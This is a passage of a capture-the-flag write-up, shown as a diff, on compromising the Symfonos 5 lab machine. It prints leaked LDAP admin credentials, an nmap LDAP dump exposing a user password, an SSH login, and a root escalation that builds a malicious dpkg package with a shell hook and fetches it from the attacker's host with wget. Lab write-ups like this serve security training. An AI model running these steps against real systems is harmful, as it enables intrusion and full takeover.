@@ -168,3 +168,115 @@ if (! $bIsAuth ) {
 }
 ?>
 ```
+
+Bingo! Some creds ``` $bind = ldap_bind($ldap_ch, "cn=admin,dc=symfonos,dc=local", "qMDdyZh3cT6eeAWD");```.
+
+LDAP is a database to keep all information related to user accounts, keeps a list of users. Some Terminology :
++ cn = Common Name
++ dc = Domain Component
+
+Let's enumerate LDAP now. I didn't know how to do that, glad for my google-fu skillz. I found this really interesting [link](https://nmap.org/nsedoc/scripts/ldap-search.html).
+
+I did some edit on CMD & bingo got a new user/password!
+
+```
+[root@pwn4magic]:~/Desktop# nmap -p 389 --script ldap-search --script-args 'ldap.username="cn=admin,dc=symfonos,dc=local",ldap.password=qMDdyZh3cT6eeAWD' 192.168.1.13
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-13 00:25 EET
+Nmap scan report for symfonos5.zte.com.cn (192.168.1.13)
+Host is up (0.00026s latency).
+
+PORT    STATE SERVICE
+389/tcp open  ldap
+| ldap-search: 
+|   Context: dc=symfonos,dc=local
+|     dn: dc=symfonos,dc=local
+|         objectClass: top
+|         objectClass: dcObject
+|         objectClass: organization
+|         o: symfonos
+|         dc: symfonos
+|     dn: cn=admin,dc=symfonos,dc=local
+|         objectClass: simpleSecurityObject
+|         objectClass: organizationalRole
+|         cn: admin
+|         description: LDAP administrator
+|         userPassword: {SSHA}UWYxvuhA0bWsjfr2bhtxQbapr9eSgKVm
+|     dn: uid=zeus,dc=symfonos,dc=local
+|         uid: zeus
+|         cn: zeus
+|         sn: 3
+|         objectClass: top
+|         objectClass: posixAccount
+|         objectClass: inetOrgPerson
+|         loginShell: /bin/bash
+|         homeDirectory: /home/zeus
+|         uidNumber: 14583102
+|         gidNumber: 14564100
+|         userPassword: cetkKf4wCuHC9FET
+|         mail: zeus@symfonos.local
+|_        gecos: Zeus User
+```
+
+`zeus/cetkKf4wCuHC9FET` Let's try to SSH now.
+
+# 0x02 Exploitation
+
+```
+[root@pwn4magic]:~/Desktop# ssh zeus@192.168.1.13
+zeus@192.168.1.13's password: 
+Linux symfonos5 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Jan 12 09:03:07 2020 from 192.168.1.14
+zeus@symfonos5:~$ whoami
+zeus
+```
+
+Perfect.
+
+# 0x03 Privilege Escalation
+
+Let's check `sudo -l`.
+
+```
+zeus@symfonos5:~$ sudo -l
+Matching Defaults entries for zeus on symfonos5:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User zeus may run the following commands on symfonos5:
+    (root) NOPASSWD: /usr/bin/dpkg
+```
+
+We can run `dpkg` as root perfect. I followed [gtfobins](https://gtfobins.github.io/gtfobins/dpkg/) page.
+
+From my machine i did this :
+```
+[root@pwn4magic]:~/Desktop# TF=$(mktemp -d)
+[root@pwn4magic]:~/Desktop# echo 'exec /bin/sh' > $TF/x.sh
+[root@pwn4magic]:~/Desktop# fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF
+Debian packaging tools generally labels all files in /etc as config files, as mandated by policy, so fpm defaults to this behavior for deb packages. You can disable this default behavior with --deb-no-default-config-files flag {:level=>:warn}
+Created package {:path=>"x_1.0_all.deb"}
+[root@pwn4magic]:~/Desktop# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+```
+
+Now let's wget it and execute it.
+
+```
+zeus@symfonos5:/tmp$ cd /tmp
+zeus@symfonos5:/tmp$ wget -q 192.168.1.14/x_1.0_all.deb
+zeus@symfonos5:/tmp$ sudo dpkg -i x_1.0_all.deb
+(Reading database ... 53057 files and directories currently installed.)
+Preparing to unpack x_1.0_all.deb ...
+# whoami;id
+root
+uid=0(root) gid=0(root) groups=0(root)
+# 
+```
+
+ROOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOTED.
